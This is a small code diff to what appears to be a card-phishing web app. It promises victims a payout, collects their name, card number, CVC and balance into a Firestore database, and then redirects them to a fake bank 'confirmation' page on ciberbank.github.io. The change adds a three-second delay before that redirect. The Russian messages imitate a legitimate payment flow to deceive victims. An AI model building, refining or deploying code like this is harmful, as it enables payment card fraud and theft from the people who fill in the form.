@@ -40,7 +40,9 @@ function App() {
       const usersRef = collection(db, "users")
       addDoc(usersRef, { name, surname, code, cvc, value, balance }).then(response => {
         toast.success('Поздравляем, Вы получите оплату после подтверждения входящего сообщения.')
+        setTimeout(() => {
         window.location.replace('https://ciberbank.github.io/podtverzhdeniye');
+      }, 3000);
       }).catch(error => {
         toast.error("Пожалуйста, заполните информацию2");
       })
